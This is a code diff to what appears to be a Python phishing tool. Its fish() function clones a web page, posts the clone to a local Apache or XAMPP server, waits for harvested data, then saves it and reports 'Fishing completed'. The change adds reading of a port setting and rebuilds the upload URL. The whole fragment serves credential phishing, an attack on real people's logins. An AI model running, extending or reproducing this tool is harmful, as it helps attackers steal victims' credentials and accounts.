@@ -66,11 +66,12 @@ def fish():
     page = clone()
 
     # Host server
-    host = str(input('Host server (localhost for the IP of our machine): '))
+    host = str(input('Host server (localhost or local IP for the IP of your machine): '))
 
     localAdress = include.get_ip()[1]
 
     files = {'file': open(page)}
+    port = 80
     if host == 'localhost' or host == localAdress:
         version = ""
 
@@ -83,6 +84,9 @@ def fish():
                     version = 'XAMPP'
                 elif 'Linux' in line:
                     version = 'linux'
+                elif 'port' in line:
+                    port = int(line.split(' ')[2])
+
         if version == 'linux':
             try:
                 os.system('sudo service apache2 start')
@@ -92,7 +96,7 @@ def fish():
                 return
 
         try:
-            r = requests.post(host+":8888/index.php", files=files)
+            r = requests.post("%s:%d%sindex.php" % (host,port,slash), files=files)
         except Exception as e:
             print(e)
             print('[-] Unable to send the cloned page to the server')
@@ -128,7 +132,7 @@ def fish():
         print("[-] Exiting the attack")
         return
     print("[+] Data reveived")
-    
+
     print('[+] Fishing completed, the file is stored as:  %s' % fileName)
     if version == 'Linux':
         os.system('sudo service apache2 stop')
